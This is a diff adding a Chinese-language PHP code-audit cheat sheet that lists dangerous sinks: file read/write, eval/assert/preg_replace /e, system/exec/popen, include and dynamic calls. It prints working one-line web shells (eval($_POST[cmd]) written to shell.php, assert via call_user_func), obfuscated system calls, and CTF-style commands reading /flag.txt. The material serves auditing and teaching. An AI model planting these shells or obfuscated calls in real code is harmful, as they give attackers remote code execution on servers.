@@ -1,3 +1,145 @@
+## php代码审计常用函数
+
+##### 1) 文件读取/写入
+```
+file_get_contents()
+highlight_file()
+fopen()
+readfile()
+//echo readfile("test.txt");
+fread()
+
+fgets() 函数从打开的文件中读取一行。
+与fgets() 相同，不同的是fgetss尝试从读取的文本中去掉任何HTML和PHP标记。
+
+parse_ini_file()
+show_source()
+file()
+```
+
+```
+//file_put_contents
+<?php 
+$test='<?php eval($_POST[cmd]);?>';
+file_put_contents('test1.php',$test);
+?>
+
+//fputs
+<?php 
+fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>'); 
+?>
+```
+##### 2) 代码执行函数
+```
+eval()
+//eval("system('ls');");
+```
+```
+assert() 
+//assert(system("cat /flag.txt");
+```
+```
+preg_replace() 
+//必须有一次匹配：preg_replace("/abc/e","system('cat /flag.txt')","abcd")
+//7.0.0	不再支持 /e修饰符。 请用 preg_replace_callback() 代替。
+//5.5.0	/e 修饰符已经被弃用了。使用 preg_replace_callback() 代替。参见文档中 PREG_REPLACE_EVAL 关于安全风险的更多信息。
+```
+```
+create_function()  
+//func =create_function('',"system('ls -al');");$func();
+```
+```
+call_user_func() / call_user_func_array()
+//?cmd=phpinfo()
+@call_user_func(assert,$_GET['cmd']);
+//?cmd=phpinfo()
+$array[0]=$_GET['cmd'];
+call_user_func_array("assert",$array);
+```
+```
+array_map()
+//$array[0]="ls";$new_array=array_map("system",$array);第一个参数是函数名，第二个参数必须是数组。
+//array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。
+```
+##### 3) 命令执行函数
+```
+system()
+exec()
+shell_exec()
+passthru()
+pcntl_exec()
+popen()
+proc_open()
+``
+```
+
+**eg. 2.php**
+
+```
+root@kali:/var/www/html# cat 2.php
+<?php
+system('id');
+echo exec('id')."\n";
+echo shell_exec("id");
+echo `id`;
+?>
+
+root@kali:/var/www/html# php 2.php
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+`无回显的popen()`
+
+```
+root@kali:/var/www/html# cat 123.php
+<?php
+$fp = popen("/bin/cat /flag.txt >123.txt","r");
+?>
+root@kali:/var/www/html# php 123.php
+root@kali:/var/www/html# cat 123.txt
+16dee3a64a607c423fdfd866be7c3762
+```
+
+`无回显的passthru`
+
+```
+root@kali:/var/www/html# cat passthru.php
+<?php passthru("cat /flag.txt >3444.txt");?>
+root@kali:/var/www/html# php passthru.php
+root@kali:/var/www/html# cat 3444.txt 
+16dee3a64a607c423fdfd866be7c3762
+```
+
+##### 4) 文件包含函数
+```
+include()
+include_once()
+require()
+require_once()
+```
+`include()`当代码执行到它的时候才加载文件,发生错误的时候只是给一个警告,然后继续往下执行。
+`require()`是只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行 require一般是用于文件头包含类文件、数据库等等文件,include一般是用于包含html模版文件 。
+`include_once()、require_once()`与(`include\require`)的功能相同,只是区别于当重复调用的时候，它只会调用一次。
+
+##### 5) 动态函数
+
+PHP函数直接由字符串拼接
+代码示例：
+
+```
+//?a=assert&b=phpinfo()
+<?php 
+$_GET['a']($_GET['b']);
+?>
+
+<?php
+$a="s"."syt"."em";$a("ls");
+?>
+```
+
 ## 常规漏洞 GET flag
 
 #### SQL injection
